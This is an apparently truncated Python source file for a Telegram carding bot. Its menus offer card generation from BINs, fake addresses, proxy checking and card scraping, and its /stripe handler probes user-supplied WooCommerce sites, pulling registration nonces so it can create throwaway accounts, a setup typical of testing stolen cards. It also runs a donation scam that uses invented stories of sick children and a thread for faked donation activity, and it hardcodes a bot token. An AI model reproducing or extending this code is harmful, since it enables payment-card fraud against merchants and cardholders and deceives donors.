import telebot
import time
import threading
from telebot import types
import requests, random, json, string,re
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
from faker import Faker
from reg import reg
import os
import telebot
import html

token = '8539098531:AAHizeT66679WvTnwvELRGQ2zN89_4UZ_WY'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6052713305
myid = ['6843321125']
admins=['6843321125']
user_canal = '@wafa4048'
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}
running_jobs = {}
running_jobs_lock = threading.Lock()


@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
    	bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
    	return 
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username= message.from_user.username
    try:
        member = bot.get_chat_member('@wafa4048', user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/wafa4048')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")
        return
    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑺𝒕𝒓𝒊𝒑𝑶𝒕𝒉 𝒊𝒏𝒔𝒑𝒆𝒄𝒕𝒊𝒐𝒏 𝒂𝒏𝒅 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕. 𝑰𝒕'𝒔 𝒂 𝒈𝒆𝒏𝒆𝒓𝒂𝒍 𝒃𝒐𝒕 𝒇𝒐𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝑺𝒕𝒓𝒊𝒑 𝑨𝒖𝒕𝒉 𝑨𝒏𝒅 𝑷𝒂𝒚𝑷𝒂𝒍 𝒈𝒂𝒕𝒆𝒘𝒂𝒚𝒔. 𝑻𝒉𝒆 𝒃𝒐𝒕 𝒉𝒂𝒔 𝒎𝒂𝒏𝒚 𝒇𝒆𝒂𝒕𝒖𝒓𝒆𝒔, 𝒔𝒐 𝒃𝒆 𝒄𝒂𝒓𝒆𝒇𝒖𝒍 𝒘𝒉𝒆𝒏 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒆𝒎 𝒂𝒏𝒅 𝒍𝒊𝒎𝒊𝒕 𝒕𝒉𝒆𝒊𝒓 𝒖𝒔𝒆. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒔𝒖𝒓𝒆 𝒚𝒐𝒖𝒓 𝒈𝒂𝒕𝒆𝒘𝒂𝒚𝒔 𝒂𝒓𝒆 𝒔𝒆𝒄𝒖𝒓𝒆 𝒘𝒉𝒆𝒏 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝒕𝒉𝒆𝒎 𝒕𝒉𝒓𝒐𝒖𝒈𝒉 𝒕𝒉𝒆 𝒃𝒐𝒕, 𝒂𝒔 𝒊𝒕'𝒔 𝒃𝒂𝒔𝒆𝒅 𝒔𝒐𝒍𝒆𝒍𝒚 𝒐𝒏 𝒓𝒆𝒒𝒖𝒆𝒔𝒕𝒔 𝒂𝒏𝒅 𝒏𝒐𝒕 𝑺𝒆𝒍𝒆𝒏𝒊𝒖𝒎. 𝑬𝒏𝒋𝒐𝒚 𝒖𝒔𝒊𝒏𝒈 𝒊𝒕 𝒂𝒏𝒅 𝒕𝒉𝒂𝒏𝒌 𝒕𝒉𝒆 𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓𝒔 @𝑩11𝑯𝑩 .

[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑢𝑛𝑙𝑜𝑐𝑘 𝑓𝑟𝑒𝑒 𝑏𝑜𝑡 𝑜𝑝𝑡𝑖𝑜𝑛𝑠 /cm 
[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑢𝑛𝑙𝑜𝑐𝑘 𝑝𝑎𝑖𝑑 𝑏𝑜𝑡 𝑜𝑝𝑡𝑖𝑜𝑛𝑠 /cm2 
[<a href="https://t.me/l">ϟ</a>] 𝑻𝒐 𝒖𝒏𝒍𝒐𝒄𝒌 𝒄𝒂𝒓𝒅 𝒈𝒆𝒏 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 /gm  
[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑑𝑜𝑛𝑎𝑡𝑒 𝑣𝑖𝑎 𝑏𝑜𝑡 /donation 

[<a href="https://t.me/l">ϟ</a>] 𝐶ℎ𝑜𝑜𝑠𝑒 𝑎 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑎𝑛𝑑 𝑖𝑡 𝑤𝑖𝑙𝑙 𝑏𝑒 𝑡𝑟𝑎𝑛𝑠𝑓𝑒𝑟𝑟𝑒𝑑 𝑡𝑜 𝑎 𝑠𝑝𝑒𝑐𝑖𝑓𝑖𝑐 𝑖𝑛𝑡𝑒𝑟𝑓𝑎𝑐𝑒 𝑎𝑐𝑐𝑜𝑟𝑑𝑖𝑛𝑔 𝑡𝑜 𝑡ℎ𝑒 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑦𝑜𝑢 𝑠𝑒𝑙𝑒𝑐𝑡𝑒𝑑, 𝑚𝑦 𝑓𝑟𝑖𝑒𝑛𝑑 @{username} '''
    FRA=types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('𝐻𝑒 𝑠𝑢𝑏𝑚𝑖𝑡𝑡𝑒𝑑 𝑎 𝑛𝑜𝑡𝑒 𝑡𝑜 𝑡ℎ𝑒 𝑏𝑜𝑡 𝑜𝑤𝑛𝑒𝑟', callback_data='yrr')
   
    FRA.add(Yes22)
    video_url = 'https://t.me/+xxbDXfpnF0kyODBk' 
    bot.send_photo(message.chat.id, video_url, caption=IU,parse_mode='HTML', reply_markup=FRA)
    
    
OWNER_ID = 6843321125
waiting_users = {}
reply_mode = {}
@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def Alii(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username= call.from_user.username
    Atty=types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("  𝑩𝒂𝒄𝒌 ",callback_data="start")
    Atty.add(back)
    YTT=f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 <a href='tg://user?id={user_id}'>{userr}</a> 𝑺𝒆𝒏𝒅 𝒚𝒐𝒖𝒓 𝒂𝒅𝒗𝒊𝒄𝒆, 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌, 𝒐𝒓 𝒑𝒓𝒐𝒃𝒍𝒆𝒎, 𝒂𝒏𝒅 𝒚𝒐𝒖 𝒘𝒊𝒍𝒍 𝒓𝒆𝒄𝒆𝒊𝒗𝒆 𝒂 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆 𝒇𝒓𝒐𝒎 𝒕𝒉𝒆 𝒎𝒂𝒏𝒂𝒈𝒆𝒓𝒔 . 
 '''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT,parse_mode='HTML', reply_markup=Atty)
    waiting_users[user_id] = True
    



@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    username = message.from_user.username

    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton(" رد ", callback_data=f"reply_{user_id}"))

    bot.send_message(OWNER_ID, f"New Massege\n\nName: {name}\nID Name: {user_id}\nMassege: {message.text}",reply_markup=kb )

    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message 🔁", callback_data="yrr"))

    bot.send_message(
        user_id,
        "Your message has been sent ✅",
        reply_markup=kb2
    )

    waiting_users.pop(user_id)
        
@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])

    reply_mode[call.from_user.id] = user_id

    bot.send_message(call.from_user.id, "Write your reply now 💭")
    
    
@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]

    bot.send_message(
        user_id,
        f"Administration response 📩 :\n\n{message.text}"
    )

    bot.send_message(OWNER_ID, "The message has been sent ✅")

    reply_mode.pop(message.from_user.id)



    
    
   
@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username
    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑺𝒕𝒓𝒊𝒑𝑶𝒕𝒉 𝒊𝒏𝒔𝒑𝒆𝒄𝒕𝒊𝒐𝒏 𝒂𝒏𝒅 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕. 𝑰𝒕'𝒔 𝒂 𝒈𝒆𝒏𝒆𝒓𝒂𝒍 𝒃𝒐𝒕 𝒇𝒐𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝑺𝒕𝒓𝒊𝒑 𝑨𝒖𝒕𝒉 𝑨𝒏𝒅 𝑷𝒂𝒚𝑷𝒂𝒍 𝒈𝒂𝒕𝒆𝒘𝒂𝒚𝒔. 𝑻𝒉𝒆 𝒃𝒐𝒕 𝒉𝒂𝒔 𝒎𝒂𝒏𝒚 𝒇𝒆𝒂𝒕𝒖𝒓𝒆𝒔, 𝒔𝒐 𝒃𝒆 𝒄𝒂𝒓𝒆𝒇𝒖𝒍 𝒘𝒉𝒆𝒏 𝒖𝒔𝒊𝒏𝒈 𝒕𝒉𝒆𝒎 𝒂𝒏𝒅 𝒍𝒊𝒎𝒊𝒕 𝒕𝒉𝒆𝒊𝒓 𝒖𝒔𝒆. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒔𝒖𝒓𝒆 𝒚𝒐𝒖𝒓 𝒈𝒂𝒕𝒆𝒘𝒂𝒚𝒔 𝒂𝒓𝒆 𝒔𝒆𝒄𝒖𝒓𝒆 𝒘𝒉𝒆𝒏 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒏𝒈 𝒕𝒉𝒆𝒎 𝒕𝒉𝒓𝒐𝒖𝒈𝒉 𝒕𝒉𝒆 𝒃𝒐𝒕, 𝒂𝒔 𝒊𝒕'𝒔 𝒃𝒂𝒔𝒆𝒅 𝒔𝒐𝒍𝒆𝒍𝒚 𝒐𝒏 𝒓𝒆𝒒𝒖𝒆𝒔𝒕𝒔 𝒂𝒏𝒅 𝒏𝒐𝒕 𝑺𝒆𝒍𝒆𝒏𝒊𝒖𝒎. 𝑬𝒏𝒋𝒐𝒚 𝒖𝒔𝒊𝒏𝒈 𝒊𝒕 𝒂𝒏𝒅 𝒕𝒉𝒂𝒏𝒌 𝒕𝒉𝒆 𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓𝒔 @𝑩11𝑯𝑩 .

[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑢𝑛𝑙𝑜𝑐𝑘 𝑓𝑟𝑒𝑒 𝑏𝑜𝑡 𝑜𝑝𝑡𝑖𝑜𝑛𝑠 /cm 
[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑢𝑛𝑙𝑜𝑐𝑘 𝑝𝑎𝑖𝑑 𝑏𝑜𝑡 𝑜𝑝𝑡𝑖𝑜𝑛𝑠 /cm2 
[<a href="https://t.me/l">ϟ</a>] 𝑻𝒐 𝒖𝒏𝒍𝒐𝒄𝒌 𝒄𝒂𝒓𝒅 𝒈𝒆𝒏 𝒐𝒑𝒕𝒊𝒐𝒏𝒔 /gm  
[<a href="https://t.me/l">ϟ</a>] 𝑇𝑜 𝑑𝑜𝑛𝑎𝑡𝑒 𝑣𝑖𝑎 𝑏𝑜𝑡 /donation 

[<a href="https://t.me/l">ϟ</a>] 𝐶ℎ𝑜𝑜𝑠𝑒 𝑎 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑎𝑛𝑑 𝑖𝑡 𝑤𝑖𝑙𝑙 𝑏𝑒 𝑡𝑟𝑎𝑛𝑠𝑓𝑒𝑟𝑟𝑒𝑑 𝑡𝑜 𝑎 𝑠𝑝𝑒𝑐𝑖𝑓𝑖𝑐 𝑖𝑛𝑡𝑒𝑟𝑓𝑎𝑐𝑒 𝑎𝑐𝑐𝑜𝑟𝑑𝑖𝑛𝑔 𝑡𝑜 𝑡ℎ𝑒 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑦𝑜𝑢 𝑠𝑒𝑙𝑒𝑐𝑡𝑒𝑑, 𝑚𝑦 𝑓𝑟𝑖𝑒𝑛𝑑 @{username} '''

    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('𝐻𝑒 𝑠𝑢𝑏𝑚𝑖𝑡𝑡𝑒𝑑 𝑎 𝑛𝑜𝑡𝑒 𝑡𝑜 𝑡ℎ𝑒 𝑏𝑜𝑡 𝑜𝑤𝑛𝑒𝑟', callback_data='yrr')
    FRA.add(Yes22)
    video_url = 'https://t.me/C0CCOCOvjk/9' 
    from telebot.types import InputMediaPhoto
    photo_url = 'https://t.me/C0CCOCOvjk/9'
    bot.edit_message_media(
    media=InputMediaPhoto(media=photo_url, caption=IU, parse_mode='HTML'),
    chat_id=call.message.chat.id,
    message_id=call.message.message_id,
    reply_markup=FRA
)





@bot.message_handler(func=lambda message: message.text.lower().startswith('.cm2') or message.text.lower().startswith('/cm2'))
def Alii4(message):
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username= message.from_user.username
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
	    bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
	    return 
    user_id = str(message.chat.id)
    try:
        member = bot.get_chat_member('@arr_cr', user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/arr_cr')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")  
    Atty2=types.InlineKeyboardMarkup(row_width=2)
    bakk1 = types.InlineKeyboardButton("  Back  ", callback_data="start")
    Atty2.add(bakk1)
    YTT2=f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 <a href='tg://user?id={user_id}'>{userr}</a> 𝑰𝒏 𝒕𝒉𝒆 𝒇𝒓𝒆𝒆 𝒘𝒊𝒕𝒉𝒅𝒓𝒂𝒘𝒂𝒍 𝒑𝒂𝒏𝒆𝒍, 𝒚𝒐𝒖'𝒍𝒍 𝒇𝒊𝒏𝒅 𝑷𝒂𝒚𝑷𝒂𝒍 𝒂𝒏𝒅 𝑺𝒕𝒓𝒊𝒑𝒆 𝒘𝒊𝒕𝒉𝒅𝒓𝒂𝒘𝒂𝒍𝒔 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒍𝒚 𝒇𝒓𝒆𝒆. 𝑺𝒘𝒊𝒑𝒆 𝒂𝒏𝒅 𝒆𝒏𝒋𝒐𝒚 !
    	

Stripe Auth [url] . ON ✅ >> /stripe 
PayPal Custom [url] [inurl] . ON ✅ >> /paypal 
'''

    photo_url = 'https://t.me/C0CCOCOvjk/8'
    bot.send_photo(message.chat.id, photo_url, caption=YTT2,parse_mode='HTML', reply_markup=Atty2)

    
    
    
    
    
    
    
    
    
    
@bot.message_handler(func=lambda message: message.text.lower().startswith('.cm') or message.text.lower().startswith('/cm'))
def Alii4(message):
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username= message.from_user.username
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
	    bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
	    return 
    user_id = str(message.chat.id)
    try:
        member = bot.get_chat_member('@wafa4048', user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/wafa4048')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")  
    Atty2=types.InlineKeyboardMarkup(row_width=2)
    bakk1 = types.InlineKeyboardButton("  Back  ", callback_data="start")
    Atty2.add(bakk1)
    YTT2=f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒆 𝒇𝒓𝒆𝒆 𝒃𝒐𝒕 𝒊𝒏𝒕𝒆𝒓𝒇𝒂𝒄𝒆 𝒄𝒐𝒏𝒕𝒂𝒊𝒏𝒔 𝒎𝒂𝒏𝒚 𝒖𝒏𝒊𝒒𝒖𝒆 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔; 𝒖𝒔𝒆 𝒕𝒉𝒆𝒎 𝒂𝒏𝒅 𝒈𝒊𝒗𝒆 𝒚𝒐𝒖𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒕𝒐 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓 .
    	

BIN Info . ON ✅ >> /bin
Generator Address . ON ✅ >> /fake
Register To The Bot . ON ✅ >> /rag
Plan Info . ON ✅ >> /info
ID Profal . ON ✅ >> /id
Cheker Proxies . ON ✅ >> /proxi
Admin Panel . ON ✅ >> /admin '''

    photo_url = 'https://t.me/+xxbDXfpnF0kyODBk'
    bot.send_photo(message.chat.id, photo_url, caption=YTT2,parse_mode='HTML', reply_markup=Atty2)





    








    
@bot.message_handler(func=lambda message: message.text.lower().startswith('.gm') or message.text.lower().startswith('/gm'))
def Alii4(message):
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username= message.from_user.username
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
	    bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
	    return 
    user_id = str(message.chat.id)
    try:
        member = bot.get_chat_member('@wafa4048', user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/wafa4048')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")  
    Atty2=types.InlineKeyboardMarkup(row_width=2)
    bakk1 = types.InlineKeyboardButton("  Back  ", callback_data="start")
    Atty2.add(bakk1)
    YTT2=f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 <a href='tg://user?id={user_id}'>{userr}</a> 𝑰𝒏 𝒕𝒉𝒆 𝒄𝒂𝒓𝒅 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒑𝒂𝒏𝒆𝒍, 𝒄𝒂𝒓𝒅 𝒇𝒊𝒍𝒆, 𝒂𝒏𝒅 𝒔𝒄𝒓𝒂𝒑 𝒇𝒓𝒐𝒎 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔, 𝒖𝒔𝒆 𝒕𝒉𝒆 𝒃𝒐𝒕 𝒂𝒏𝒅 𝒈𝒊𝒗𝒆 𝒚𝒐𝒖𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒕𝒐 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓 .
    	

Generating 10 Cards . ON ✅ >> /gen
- Exm: 
	/gen [Bin]

Generating A Card File . OFF ❌ >> /gtp
- Exm:
	/gtp [Bin] [Nmber]

Channel scrap . OFF ❌ >> /scr  
- Exm:
	/scr [Channel]'''

    photo_url = 'https://t.me/+xxbDXfpnF0kyODBk'
    bot.send_photo(message.chat.id, photo_url, caption=YTT2,parse_mode='HTML', reply_markup=Atty2)














DB = "date.json"
GOAL = 10000
def load():
    if not os.path.exists(DB):
        return {"users": {}, "total": 0}
    return json.load(open(DB))

def save(d):
    json.dump(d, open(DB, "w"), indent=4)

def add(uid, amount):
    d = load()
    uid = str(uid)

    if uid not in d["users"]:
        d["users"][uid] = {"total": 0, "count": 0}

    d["users"][uid]["total"] += amount
    d["users"][uid]["count"] += 1
    d["total"] += amount

    save(d)


stories = [
{"name":"Ali","age":5,"case":"heart surgery","left":1200},
{"name":"Sara","age":7,"case":"cancer treatment","left":900},
{"name":"Omar","age":4,"case":"critical operation","left":1500},
]

def get_story():
    return random.choice(stories)


def badge(total):
    if total >= 2000:
        return "👑 Legend"
    elif total >= 500:
        return "🦸 Hero"
    else:
        return "😇 Angel"


def progress():
    d = load()
    total = d["total"]
    percent = int((total/GOAL)*100) if GOAL else 0
    bar = "█"*(percent//10) + "░"*(10-percent//10)
    return f"{bar} {percent}%\n⭐ {total}/{GOAL}"



@bot.message_handler(commands=['donation'])
def donation(m):
    s = get_story()

    text = f"""
<b>Al Ostora Donation Foundation</b>

💔 Somewhere right now...
A child is crying in pain.
A mother is praying for a miracle.
A father is helpless...

These children are not numbers.
They are dreams… lives… futures…

✨ Your donation today could be:
• The medicine they desperately need
• The surgery that saves their life
• The hope their family is waiting for

⛔ If no one helps… some of them won’t survive.

━━━━━━━━━━━━━━━
{progress()}
━━━━━━━━━━━━━━━

Choose the option below to donate

or type the command /don and the number of your donation, and donate to children 
"""


    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("10", callback_data="buy_10"),
        types.InlineKeyboardButton("50", callback_data="buy_50"),
        types.InlineKeyboardButton("100", callback_data="buy_100"),
        types.InlineKeyboardButton("500", callback_data="buy_500"),
    )

    fff = 'https://t.me/C0CCOCOvjk/11'
    bot.send_photo(m.chat.id,fff, text, reply_markup=kb)


@bot.message_handler(commands=['don'])
def don(m):
    try:
        amount = int(m.text.split()[1])
    except:
        bot.reply_to(m, "Exa: /don 50")
        return
    send_invoice(m.chat.id, amount)


def send_invoice(chat_id, amount):
    bot.send_invoice(
        chat_id=chat_id,
        title="Donation",
        description="Support children",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label="Donation", amount=amount)],
        start_parameter="don",
        invoice_payload=f"don_{amount}"
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def buy(c):
    amount = int(c.data.split("_")[1])
    send_invoice(c.message.chat.id, amount)


@bot.pre_checkout_query_handler(func=lambda q: True)
def checkout(q):
    bot.answer_pre_checkout_query(q.id, ok=True)


@bot.message_handler(content_types=['successful_payment'])
def success(m):

    amount = m.successful_payment.total_amount
    user = m.from_user

    add(user.id, amount)

    d = load()
    total = d["users"][str(user.id)]["total"]

    msg = f"""
❤️ <b>THANK YOU</b> ❤️

You gave hope...
You saved a life...

👶 A child can continue treatment
🏥 A family can breathe again

━━━━━━━━━━━━━━━
⭐ Your total: {total}
🏅 Rank: {badge(total)}
━━━━━━━━━━━━━━━

You are part of Al Ostora now.
"""

    bot.send_message(m.chat.id, msg)



@bot.message_handler(commands=['top'])
def top(m):
    d = load()["users"]
    s = sorted(d.items(), key=lambda x:x[1]["total"], reverse=True)

    text = "🏆 Top Donors\n\n"
    for i,(uid,v) in enumerate(s[:5]):
        text += f"{i+1}. {uid} - ⭐ {v['total']}\n"

    bot.send_message(m.chat.id, text)


@bot.message_handler(commands=['goal'])
def goal(m):
    bot.send_message(m.chat.id, progress())


def fake_activity():
    while True:
        time.sleep(random.randint(30,60))
        msg = random.choice([
            "💸 Someone donated 50 ⭐",
            "❤️ A new donation received",
            "🌟 Support is growing"
        ])
        # تگدر تحدد قناة او شات
        # bot.send_message(chat_id, msg)

threading.Thread(target=fake_activity).start()



def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)

@bot.message_handler(commands=['id'])
def send_user_info(message):
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
	    bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
	    return 
    user = message.from_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or 'No Username'
    chat = bot.get_chat(user_id)
    bio = chat.bio or "No Bio"
    try:
        member = bot.get_chat_member(user_canal, user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/arr_cr')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")

    
    photos = bot.get_user_profile_photos(user_id)
    if photos.total_count > 0:
        photo_id = photos.photos[0][0].file_id
    else:
        photo_id = None

    data = read_data()
    user_data = data.get(str(user_id))  
    if not user_data:
        user_data = {
            "plan": "Free",
            "timer": "Unlimited"
        }
        data[str(user_id)] = user_data   
        write_data(data)

 
    info = f"""
<b>[<a href="https://t.me/l">ϟ</a>] Name:</b> {first_name}
<b>[<a href="https://t.me/l">ϟ</a>] ID:</b> <code>{user_id}</code>
<b>[<a href="https://t.me/l">ϟ</a>] Username:</b> @{username}
<b>[<a href="https://t.me/l">ϟ</a>] Bio:</b> {bio}
<b>[<a href="https://t.me/l">ϟ</a>] Plan:</b> {user_data['plan']}
<b>[<a href="https://t.me/l">ϟ</a>] Time Plan:</b> {user_data['timer']}
"""


    if photo_id:
        bot.send_photo(message.chat.id, photo_id, caption=info, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, info, parse_mode="HTML")



def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)


    
    

@bot.message_handler(func=lambda message: message.text.lower().startswith('.rag') or message.text.lower().startswith('/rag'))
def register(message):
    with open("blockusers.txt", "r") as file:
	    blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
	    bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
	    return 
    user_id = str(message.chat.id)
    try:
        member = bot.get_chat_member(user_canal, user_id)
        if member.status == 'left':
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/arr_cr')
            markup.add(btn)
            bot.send_message(user_id, text="Join the channel to continue.", reply_markup=markup)
            return
    except Exception as e:
        bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")  
    plan = "𝗙𝗥𝗘𝗘"
    timer = "none"
    data = read_data()
    if user_id in data:
        bot.reply_to(message, "You Are Registered With This Bot, Press /info To See Your plan")
    else:
        data[user_id] = {
            "plan": plan,
            "timer": timer
        }

        write_data(data)
        bot.reply_to(message, "Your Data Has Been Recorded!")

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)


















@bot.message_handler(func=lambda m: m.text.lower().startswith('.stripe') or m.text.lower().startswith('/stripe'))
def ali_al2(massege):
    ko = bot.reply_to(massege, "- The gate is being withdrawn ...").message_id

    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text='''- Please send the link like this:

<code>/stripe https://xxxxxxx.xxx</code>''',
                parse_mode="HTML"
            )
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text="Invalid link format ❌",
                parse_mode="HTML"
            )
            return

        headers = {
            "User-Agent": "Mozilla/5.0"
        }
        import requests
        r = requests.get(link, headers=headers, timeout=15
        )

        if r.status_code != 200:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text=f"Site returned status: {r.status_code} ❌"
            )
            return

        source = r.text.lower()

        if "stripe" in source:
            result = "Stripe detected ✅"
        else:
            result = "Stripe not found ❌"

        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text=result
        )

    except requests.exceptions.Timeout:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="The site took too long to respond ⏳"
        )

    except requests.exceptions.ConnectionError:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Connection error or site offline ❌"
        )

    except requests.exceptions.InvalidURL:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Invalid URL ❌"
        )

    except Exception as e:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text=f"Error ❌\n<code>{e}</code>",
            parse_mode="HTML"
        )

    from user_agent import generate_user_agent
    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    res = r.get(url=f"{link}/my-account/", headers=headers).text
    reg2 = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
    if reg2:
    	reg = reg2.group(1)
    else:
        bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text='''Page not found ⚠️''',
        parse_mode="HTML"
    )
        return 
    username = f'u_{uuid.uuid4().hex[:8]}'
